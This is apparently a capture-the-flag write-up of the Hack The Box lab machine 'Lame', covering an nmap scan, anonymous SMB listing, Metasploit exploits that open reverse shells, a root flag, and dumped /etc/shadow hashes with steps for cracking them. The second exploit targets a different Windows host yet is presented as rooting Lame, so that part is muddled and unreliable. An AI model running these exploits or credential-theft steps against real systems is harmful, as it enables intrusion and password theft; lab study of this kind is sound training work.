# Hack The Box Machine Writeup
**:beginner: Machine Name:** Lame
**:rocket: Difficulty:**   Easy
**:computer: Machine IP:**  10.10.10.3
**:key: Access Mode:**  VPN


## :performing_arts:Enumeration

Conducted a comprehensive network scan using Nmap with the following flags:

- -A: Enabled OS detection, version detection, script scanning, and traceroute.

- -T4: Utilized an aggressive timing template to balance speed and detection.

- -p-: Scanned all 65,535 TCP ports to ensure complete enumeration.

Note on Real-World Applicability: This intrusive scanning method is appropriate for a controlled assessment but would require adjustment in a monitored production environment to avoid detection.

### :exclamation:Key Findings

Identified an SMB service with significant security misconfigurations:

- Guest authentication is enabled.

- Samba Version, Domain, 

- FTP with anonymous login

These vulnerabilities were documented as potential attack vectors for the exploitation phase.

**Tool**: Nmap

<details>
  <summary>Nmap Scan Results</summary>
  
  ~~~bash
    Hackden> ~ sudo nmap -A -T4 -p- 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 20:41 PKT
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.25s latency).
Not shown: 65530 filtered ports

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status

22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m50s, deviation: 2h49m47s, median: 46s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-04-17T11:47:13-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   256.89 ms 10.10.14.1 (10.10.14.1)
2   257.05 ms 10.10.10.3 (10.10.10.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 300.62 seconds
~~~

</details>

## :no_entry: Exploitation

As the SMB service was doscovered, we initiated the explotation with SMB Client tool to check if we are able to connect

**Tool:** smbclient

~~~bash
Hackden> ~ smbclient -L \\\\10.10.10.3\\
Enter WORKGROUP\danny's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
~~~

Anonymous logins were allowed and we were able to connect with smbclient with *anonymous* as username and a blank password. It shows us the shares that are availabe via SMB share but not the way to access them as anonymous user does not have permission to access them. Only listing is allowed. To exploit, an exploit is avalibe on Rapid7 Website

**Tool:** Metasploit
[Samba Usermap Script Exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)

1. Exploitation using the above exploit

~~~bash

msf5 > use exploit/multi/samba/usermap_script 
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.56:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo elbi8UhZCnSDUiWF;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "elbi8UhZCnSDUiWF\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.56:4444 -> 10.10.10.3:34811) at 2020-04-18 15:29:34 +0500
~~~

This gives us the operating system and the workgroup name and confirms that SMB service is infact running. This information can be used for further exploitation. But it does not gives us the version so we can use operating system information to search for exploit online.

[SMB NetAPI Exploit on Rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)

Target is to gain *root* level access

2.Using the exploit

~~~bash
msf5 > use exploit/windows/smb/ms08_067_netapi

msf5 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.56:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.56:4444 -> 10.10.10.4:1030) at 2020-04-16 22:19:45 +0500

~~~

Using the exploit gave us a meterpreter session but with root privileges 

~~~bash
whoami
root

hostname
lame

pwd
/
ls 

cd home	
ls
cd ..

cd root
ls
Desktop
reset_logs.sh
root.txt
vnc.log

cat root.txt
92caac3be140ef409e45721348a4e9df
~~~

## Post Exploitation

1. Grab hashes (passwd + shadwo file) from /etc/passwd & /etx/shadow

2. Using unshadow tool we can make a single file from passwd + Shadow file

~~~bash
unshadow <PASSWD FILE> <SHADOW FILE>
~~~

3. Using hashcat we can decrypt these hashes for password

<details>
   <summary>/etc/passwd Hashes</summary>

   ~~~bash
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/bin/sh
   bin:x:2:2:bin:/bin:/bin/sh
   sys:x:3:3:sys:/dev:/bin/sh
   sync:x:4:65534:sync:/bin:/bin/sync
   games:x:5:60:games:/usr/games:/bin/sh
   man:x:6:12:man:/var/cache/man:/bin/sh
   lp:x:7:7:lp:/var/spool/lpd:/bin/sh
   mail:x:8:8:mail:/var/mail:/bin/sh
   news:x:9:9:news:/var/spool/news:/bin/sh
   uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
   proxy:x:13:13:proxy:/bin:/bin/sh
   www-data:x:33:33:www-data:/var/www:/bin/sh
   backup:x:34:34:backup:/var/backups:/bin/sh
   list:x:38:38:Mailing List Manager:/var/list:/bin/sh
   irc:x:39:39:ircd:/var/run/ircd:/bin/sh
   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
   nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
   libuuid:x:100:101::/var/lib/libuuid:/bin/sh
   dhcp:x:101:102::/nonexistent:/bin/false
   syslog:x:102:103::/home/syslog:/bin/false
   klog:x:103:104::/home/klog:/bin/false
   sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
   bind:x:105:113::/var/cache/bind:/bin/false
   postfix:x:106:115::/var/spool/postfix:/bin/false
   ftp:x:107:65534::/home/ftp:/bin/false
   postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
   mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
   tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
   distccd:x:111:65534::/:/bin/false
   service:x:1002:1002:,,,:/home/service:/bin/bash
   telnetd:x:112:120::/nonexistent:/bin/false
   proftpd:x:113:65534::/var/run/proftpd:/bin/false
   statd:x:114:65534::/var/lib/nfs:/bin/false
   snmp:x:115:65534::/var/lib/snmp:/bin/false
   makis:x:1003:1003::/home/makis:/bin/sh
   ~~~

</details>

<details>
   <summary>/etc/shadow</summary>

   ~~~bash
root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::
makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::
   ~~~

</details>


<details>
   <summary>Unshadow Command Output</summary>

   ~~~bash
root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
dhcp:*:101:102::/nonexistent:/bin/false
syslog:*:102:103::/home/syslog:/bin/false
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:*:105:113::/var/cache/bind:/bin/false
postfix:*:106:115::/var/spool/postfix:/bin/false
ftp:*:107:65534::/home/ftp:/bin/false
postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:*:111:65534::/:/bin/false
service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:1002:1002:,,,:/home/service:/bin/bash
telnetd:*:112:120::/nonexistent:/bin/false
proftpd:!:113:65534::/var/run/proftpd:/bin/false
statd:*:114:65534::/var/lib/nfs:/bin/false
snmp:*:115:65534::/var/lib/snmp:/bin/false
makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:1003:1003::/home/makis:/bin/sh
   ~~~

</details>